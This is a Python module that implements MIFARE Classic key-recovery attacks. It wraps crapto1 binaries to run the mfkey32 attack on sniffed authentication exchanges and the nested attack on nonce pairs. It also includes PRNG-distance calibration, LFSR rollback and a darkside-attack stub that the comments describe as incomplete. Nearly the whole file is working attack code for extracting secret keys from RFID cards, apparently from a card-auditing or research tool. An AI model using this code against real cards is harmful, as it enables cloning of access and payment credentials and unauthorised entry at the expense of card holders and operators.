"""
MIFARE Classic key recovery algorithms.

mfkey32: Recovers key from two sniffed authentication exchanges (uses crapto1 C library).
Nested: Recovers key from nonce pairs (one known key needed).
"""

import os
import subprocess

from crypto1 import Crypto1, prng_successor, odd_parity8, LF_POLY_ODD, LF_POLY_EVEN, _filter_bit, parity32

# Paths to compiled crapto1 CLI tools
_MFKEY32_PATH = os.path.join(os.path.dirname(__file__), "crapto1", "mfkey32.exe")
_NESTED_PATH = os.path.join(os.path.dirname(__file__), "crapto1", "nested.exe")


def _bswap32(x: int) -> int:
    """Byte-swap a 32-bit value (big-endian <-> little-endian).

    The firmware sends nonces as big-endian hex strings (wire order), but
    Python's crypto1 processes values in little-endian (firmware-internal)
    order. The C crapto1 library handles this with SWAPENDIAN internally.
    This function bridges the gap for Python-side crypto operations.
    """
    return (((x >> 24) & 0xFF) |
            ((x >> 8) & 0xFF00) |
            ((x << 8) & 0xFF0000) |
            ((x << 24) & 0xFF000000))


def find_prng_distance(nt_start: int, nt_end: int, max_dist: int = 65536) -> int | None:
    """Find how many PRNG ticks separate two nonce values.

    Values are in wire order (big-endian hex from firmware). Internally
    byte-swaps to match Python's PRNG implementation.
    """
    state = _bswap32(nt_start)
    target = _bswap32(nt_end)
    for i in range(max_dist + 1):
        if state == target:
            return i
        state = prng_successor(state, 1)
    return None


def calibrate_nested_distance(uid: int, nt_known: int, nt_target_enc: int,
                              known_key: bytes, max_dist: int = 65536) -> int | None:
    """Find PRNG distance by checking which distance produces matching keystream.

    All nonce/uid values are in wire order (big-endian hex from firmware).
    Internally byte-swaps to match Python crypto1's little-endian processing.

    During nested auth, nt_target is encrypted with the key's initial keystream:
      nt_enc = nt_plain XOR crypto1_word(key, uid ^ nt_plain)
    We try each distance until the keystream matches.
    """
    uid_le = _bswap32(uid)
    nt_pred = _bswap32(nt_known)
    nt_target_le = _bswap32(nt_target_enc)
    for d in range(max_dist + 1):
        c = Crypto1(known_key)
        ks32 = c.crypto1_word(uid_le ^ nt_pred, 0)
        if ks32 == (nt_target_le ^ nt_pred):
            return d
        nt_pred = prng_successor(nt_pred, 1)
    return None


def lfsr_rollback_bit(odd: int, even: int, inp: int, is_encrypted: int):
    """Roll back the LFSR by one bit. Returns (new_odd, new_even, output_bit)."""
    # Reverse the shift
    feedin = odd & 1
    odd = ((odd >> 1) | ((even & 1) << 23)) & 0xFFFFFF
    even = (even >> 1) & 0xFFFFFF

    # Compute filter output (keystream bit)
    ret = _filter_bit(odd)

    # Reverse the feedback
    feedin ^= parity32(odd & LF_POLY_ODD)
    feedin ^= parity32(even & LF_POLY_EVEN)

    if is_encrypted:
        feedin ^= inp & 1
    else:
        feedin ^= (inp & 1) ^ ret

    # The feedback was the MSB of even before shift
    even = (even | (feedin << 23)) & 0xFFFFFF

    return odd, even, ret


def nested_recover(uid: int, distance: int,
                   nonce_pairs: list[tuple[int, int]]) -> list[bytes]:
    """
    Recover target sector key from nested authentication nonce pairs.

    Uses the nested.exe CLI tool (crapto1 lfsr_recovery32) to find the key
    from encrypted nonce data and a calibrated PRNG distance.

    Args:
        uid: 32-bit card UID
        distance: calibrated PRNG tick distance between nonces
        nonce_pairs: list of (nt_known, nt_target_enc) tuples

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    if not nonce_pairs or not os.path.isfile(_NESTED_PATH):
        return []

    args = [
        _NESTED_PATH,
        f"{uid:08X}",
        str(distance),
    ]
    for nt_k, nt_t in nonce_pairs:
        args.extend([f"{nt_k:08X}", f"{nt_t:08X}"])

    try:
        result = subprocess.run(
            args, capture_output=True, text=True, timeout=300
        )
        for line in result.stdout.splitlines():
            if line.startswith("Found key:"):
                key_hex = line.split(":")[1].strip()
                return [bytes.fromhex(key_hex)]
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return []


def mfkey32_recover(uid: int, auth_data: list[dict]) -> list[bytes]:
    """
    Recover key using mfkey32 from pairs of sniffed authentication exchanges.

    Each entry needs: nt (32-bit tag nonce), nr (32-bit encrypted reader nonce),
    ar (32-bit encrypted reader answer).

    Tries all pairs of exchanges; returns the first key found.

    Args:
        uid: 32-bit card UID
        auth_data: list of {"nt": int, "nr": int, "ar": int} dicts

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    if len(auth_data) < 2 or not os.path.isfile(_MFKEY32_PATH):
        return []

    for i in range(len(auth_data)):
        for j in range(i + 1, len(auth_data)):
            d0 = auth_data[i]
            d1 = auth_data[j]
            args = [
                _MFKEY32_PATH,
                f"{uid:08X}",
                f"{d0['nt']:08X}", f"{d0['nr']:08X}", f"{d0['ar']:08X}",
                f"{d1['nt']:08X}", f"{d1['nr']:08X}", f"{d1['ar']:08X}",
            ]
            try:
                result = subprocess.run(
                    args, capture_output=True, text=True, timeout=30
                )
                for line in result.stdout.splitlines():
                    if line.startswith("Found key:"):
                        key_hex = line.split(":")[1].strip()
                        return [bytes.fromhex(key_hex)]
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue

    return []


def darkside_recover(uid: int, nack_data: list[dict]) -> list[bytes]:
    """
    Recover key from darkside attack NACK data.

    Note: The darkside attack requires parity bits and the encrypted NACK value,
    which need firmware support for lfsr_common_prefix. The current firmware
    only detects NACK presence, not the NACK value or parity bits.

    For now, this tries mfkey32 on NACK pairs (works only if NR/AR happen to
    form valid auth exchanges, which is unlikely with random data).

    Args:
        uid: 32-bit card UID
        nack_data: list of {"nt": int, "nr_ar": bytes} dicts from NACK events

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    if len(nack_data) < 2:
        return []

    # Convert NACK data to mfkey32 format: split nr_ar into nr and ar
    auth_data = []
    for entry in nack_data:
        nr_ar = entry["nr_ar"]
        if len(nr_ar) == 8 and entry["nt"] is not None:
            auth_data.append({
                "nt": entry["nt"],
                "nr": int.from_bytes(nr_ar[:4], "big"),
                "ar": int.from_bytes(nr_ar[4:], "big"),
            })

    return mfkey32_recover(uid, auth_data)
